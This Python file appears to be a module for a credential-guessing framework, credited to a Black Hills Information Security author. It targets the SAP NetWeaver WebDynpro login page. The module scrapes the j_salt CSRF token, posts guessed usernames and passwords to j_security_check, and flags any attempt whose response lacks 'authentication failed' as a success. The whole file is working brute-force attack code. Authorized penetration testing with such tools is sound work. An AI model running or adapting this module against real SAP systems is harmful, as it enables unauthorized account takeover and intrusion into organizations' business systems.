#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
import re
import requests
import logging
from bfg.args import http as http_args
from bfg.shortcuts.http import HTTPModule, handleUA

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (' \
    'KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'

BASE_PATH = '/webdynpro/dispatcher/sap.com/tc~wd~tools'

def url():

    return http_args.url(help='Base URL, e.g. '
        'https://sap.samedomain.com. Standard paths will be suffixed.')

class Module(HTTPModule):

    description = brief_description = 'SAP Netweaver Webdynpro, ver. ' \
        '7.3007.20120613105137.0000'
    args = [url()] + http_args.getDefaults('url', invert=True)
    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    def __post_init__(self, *args, **kwargs):

        self.url += BASE_PATH

    @handleUA
    def __call__(self,username,password,*args,**kwargs):


        # Construct a session
        session = requests.Session(headers=self.headers)

        # ========================
        # GET COOKIES & CSRF TOKEN
        # ========================

        # Get cookies
        resp = session.get(self.url+'/WebDynproConsole',
                verify=self.verify_ssl,
                proxies=self.proxies)

        # Find the j_salt value from the response body
        match = re.search('name="j_salt" value="(.*?)"', resp.text)

        if not match:
            raise Exception('Failed to extract j_salt CSRF token')

        # =====================
        # GUESS THE CREDENTIALS
        # =====================
    
        # make the request
        resp = session.post(self.url+'/j_security_check',
                data={
                        'j_salt':match.groups()[0],
                        'j_username':username,
                        'j_password':password
                    },
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)

        events = []

        if re.search('Logon with password not allowed', resp.text):
            events.append(f'Logon with password not allowed: {username}')
    
        output = dict(outcome=0,
            username=username,
            password=password,
            events=events)

        # verify credentials and return outcome
        if not re.search('authentication failed', resp.text, re.I):
            output['outcome'] = 1

        return output
